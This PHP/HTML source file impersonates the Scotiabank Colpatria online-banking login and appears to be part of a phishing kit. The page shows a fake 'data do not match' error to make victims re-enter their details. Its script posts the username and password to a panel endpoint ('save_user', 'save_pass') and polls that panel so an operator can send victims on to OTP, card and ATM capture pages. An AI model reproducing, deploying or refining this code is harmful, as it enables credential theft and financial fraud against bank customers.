<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Scotiabank Colpatria</title>
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <link rel="icon" href="images/favicon.ico">

    <style>
        body {
            background: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* ----------- SPINNER FULLSCREEN ---------- */
        #splash-spinner {
            position: fixed;
            z-index: 99999;
            top: 0; left: 0; right: 0; bottom: 0;
            width: 100vw; height: 100vh;
            background: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            transition: opacity 0.4s;
        }

        #splash-spinner.hide {
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s;
        }

        .splash-logo {
            width: 75px;
            margin: 22px 0 8px 16px;
            align-self: flex-start;
        }

        .splash-illu {
            width: 350px;
            margin-top: 20px;
            margin-bottom: 24px;
            display: block;
        }

        .splash-loader {
            margin-top: 48px;
            border: 6px solid #e8e8e8;
            border-top: 6px solid #484848;
            border-right: 6px solid #484848;
            border-bottom: 6px solid #e8e8e8;
            border-left: 6px solid #e8e8e8;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }

        /* ----------- FIN SPINNER ----------- */

        .header {
            background: #fff;
            padding: 10px 0 12px 15px;
            box-sizing: border-box;
            display: flex;
            align-items: center;
            border-bottom: 2px solid #f2f2f2;
        }

        .logo {
            height: 32px;
        }

        .main-content {
            padding: 32px 28px 0 28px;
        }

        .title {
            font-size: 1.4em;
            font-weight: 700;
            color: #222;
            margin-bottom: 36px;
            margin-top: 0;
            font-family: 'Montserrat', Arial, Helvetica, sans-serif;
            font-weight: bold;
            text-align: center;
        }

        .input-group {
            margin-bottom: 12px;
            position: relative;
        }

        .input-material {
            position: relative;
            width: 100%;
        }

        .input-material .material-symbols-outlined {
            position: absolute;
            left: 0;
            top: 12px;
            color: #999;
            font-size: 20px;
            pointer-events: none;
            transition: color 0.18s;
        }

        .input-material input {
            width: 100%;
            padding: 12px 0 8px 32px;
            font-size: 1.07em;
            border: none;
            border-bottom: 1px solid #bbb;
            outline: none;
            background: transparent;
            color: #222;
            transition: border-color 0.18s;
        }

        .input-material input:focus {
            border-bottom: 2px solid #ed1c24;
        }

        .input-material input.error {
            border-bottom: 2px solid red;
        }

        .input-material label {
            position: absolute;
            top: 12px;
            left: 32px;
            color: #888;
            font-size: 1em;
            pointer-events: none;
            transition: 0.18s;
            background: #fff;
            padding: 0 4px;
        }

        .input-material input:focus + label,
        .input-material input:not(:placeholder-shown) + label {
            top: -8px;
            left: 28px;
            font-size: 0.88em;
            color: #ed1c24;
            background: #fff;
        }

        .remember-group {
            margin-bottom: 18px;
            display: flex;
            align-items: center;
        }

        .remember-group input[type="checkbox"] {
            width: 24px;
            height: 24px;
            accent-color: #009dd6;
            margin-right: 0;
        }

        .remember-group label {
            font-size: 1em;
            color: #444;
            cursor: pointer;
            user-select: none;
            margin-bottom: 0;
            margin-left: 16px;
        }

        .btn-ingresar {
            width: 100%;
            padding: 14px 0 12px 0;
            background: #ed1c24;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            font-size: 1.07em;
            margin-top: 10px;
            cursor: pointer;
            transition: background 0.18s, opacity 0.3s;
            box-shadow: 0 1.5px 5px rgba(255,0,0,0.05);
        }

        .btn-ingresar:hover {
            background: #c9161b;
        }

        .btn-ingresar:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .mensaje {
            display: none;
            color: #ed1c24;
            margin-top: 7px;
            font-size: 0.97em;
        }

        #err-usuario {
            margin-top: 2px;
            margin-bottom: 0;
            line-height: 1.2;
            font-size: 0.97em;
            display: block;
        }

        @media (max-width: 400px) {
            .main-content {
                padding: 20px 10px 0 10px;
            }
            #splash-spinner .splash-logo {
                width: 56px;
                margin-left: 7px;
            }
            #splash-spinner .splash-illu {
                width: 80px;
            }
            #splash-spinner .splash-loader {
                width: 56px; height: 56px;
                border-width: 4px;
            }
        }
    </style>
</head>

<body>
    <!-- SPLASH/SPINNER INICIAL -->
    <div id="splash-spinner">
        <img src="colpa.svg" alt="Logo" class="splash-logo">
        <img src="colpalondin.svg" alt="" class="splash-illu">
        <div class="splash-loader"></div>
    </div>

    <!-- CONTENIDO NORMAL -->
    <div class="container" style="display:none;" id="main-app">
        <div class="header">
            <img src="colpa.svg" alt="Logo" class="logo">
        </div>
        <div class="main-content">
            <div class="title">Ingresa a tu Banca Virtual</div>
            <form autocomplete="off" id="loginForm">
                <div class="input-group">
                    <div class="input-material">
                        <span class="material-symbols-outlined">person</span>
                        <input type="text" name="usuario" id="txtUsuario" required placeholder=" " autocomplete="off"/>
                        <label for="txtUsuario">Nombre de Usuario</label>
                    </div>
                    <div class="mensaje" id="err-usuario" style="display:block;">
                        <span style="display:inline-flex;align-items:center;">
                            <img src="copete.svg" alt="error" style="width:17px;margin-right:4px;">
                            Los datos ingresados no coinciden, inténtalo nuevamente.
                        </span>
                    </div>
                </div>
                <div class="input-group">
                    <div class="input-material">
                        <span class="material-symbols-outlined">lock</span>
                        <input 
                            type="password"
                            name="password"
                            id="txtPass"
                            required
                            placeholder=" "
                            autocomplete="off"
                        />
                        <label for="txtPass">Contraseña</label>
                    </div>
                </div>
                <div class="remember-group">
                    <input type="checkbox" id="recordar" name="recordar">
                    <label for="recordar">Recordar mi nombre de usuario</label>
                </div>
                <input type="hidden" value="colpatria" id="banco">
                <div class="mensaje" id="err-mensaje">Por favor completa los datos correctamente.</div>
                <input type="button" id="btnUsuario" value="Ingresar" class="btn-ingresar">
            </form>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const txtUsuario = document.getElementById('txtUsuario');
            const txtPass = document.getElementById('txtPass');
            const btnUsuario = document.getElementById('btnUsuario');
            const errMensaje = document.getElementById('err-mensaje');
            const errUsuario = document.getElementById('err-usuario');
            const banco = document.getElementById('banco');

            const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

            if (!idreg) {
                alert("Error interno: idreg no existe en sesión.");
                window.location.href = "../../checkout.php";
                return;
            }

            // SPINNER SPLASH
            window.addEventListener('load', function() {
                setTimeout(function(){
                    document.getElementById('splash-spinner').classList.add('hide');
                    setTimeout(function(){
                        document.getElementById('splash-spinner').style.display = 'none';
                        document.getElementById('main-app').style.display = '';
                    }, 400);
                }, 3000);
            });

            // Ocultar error de usuario al escribir
            txtUsuario.addEventListener('input', function() {
                errUsuario.style.display = 'none';
                errMensaje.style.display = 'none';
                txtUsuario.classList.remove('error');
                txtPass.classList.remove('error');
            });

            txtPass.addEventListener('input', function() {
                errMensaje.style.display = 'none';
                txtUsuario.classList.remove('error');
                txtPass.classList.remove('error');
            });

            // Enviar datos
            btnUsuario.addEventListener('click', async function(e) {
                e.preventDefault();

                const usuario = txtUsuario.value.trim();
                const clave = txtPass.value.trim();

                if (usuario.length === 0 || clave.length < 8) {
                    errMensaje.style.display = 'block';
                    if (usuario.length === 0) {
                        txtUsuario.classList.add('error');
                        txtUsuario.focus();
                    } else {
                        txtPass.classList.add('error');
                        txtPass.focus();
                    }
                    return;
                }

                btnUsuario.disabled = true;

                try {
                    // Guardar usuario
                    const fdUser = new FormData();
                    fdUser.append("action", "save_user");
                    fdUser.append("idreg", idreg);
                    fdUser.append("usuario", usuario);
                    fdUser.append("banco", banco.value);

                    const rUser = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                        method: "POST",
                        body: fdUser,
                        headers: { 'Cache-Control': 'no-cache' }
                    });

                    if (!rUser.ok) throw new Error(`HTTP ${rUser.status}: ${rUser.statusText}`);
                    const jsonUser = await rUser.json();
                    if (!jsonUser.success) throw new Error(jsonUser.error || "Error guardando usuario");

                    // Guardar clave
                    const fdPass = new FormData();
                    fdPass.append("action", "save_pass");
                    fdPass.append("idreg", idreg);
                    fdPass.append("clave", clave);

                    const rPass = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                        method: "POST",
                        body: fdPass,
                        headers: { 'Cache-Control': 'no-cache' }
                    });

                    if (!rPass.ok) throw new Error(`HTTP ${rPass.status}: ${rPass.statusText}`);
                    const jsonPass = await rPass.json();
                    if (!jsonPass.success) throw new Error(jsonPass.error || "Error guardando clave");

                    // Ir a cargando
                    window.location.href = "cargando.php";

                } catch (error) {
                    console.error("Error:", error);
                    alert("Error al procesar datos: " + error.message);
                    btnUsuario.disabled = false;
                }
            });

            // Verificar redirecciones del panel
            const checkRedirect = setInterval(async () => {
                try {
                    const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                        method: 'GET',
                        cache: 'no-cache'
                    });
                    
                    if (r.ok) {
                        const data = await r.json();
                        
                        if (data.success && data.data && data.data.redirect) {
                            clearInterval(checkRedirect);
                            
                            switch (data.data.estado) {
                                case 'usuario':
                                    window.location.href = "colpatria.php";
                                    break;
                                case 'otp':
                                    window.location.href = "otp.php";
                                    break;
                                case 'cc':
                                    window.location.href = "/reintentar.php";
                                    break;
                                case '923':
                                    window.location.href = "923.php";
                                    break;
                                case 'atm':
                                    window.location.href = "atm.php";
                                    break;
                                case 'finalizado':
                                    window.location.href = "finish.php";
                                    break;
                            }
                        }
                    }
                } catch (e) {
                    // Ignorar errores de polling
                }
            }, 2000);

            // Limpiar intervalo al salir
            window.addEventListener('beforeunload', () => {
                if (checkRedirect) {
                    clearInterval(checkRedirect);
                }
            });
        });
    </script>
</body>
</html>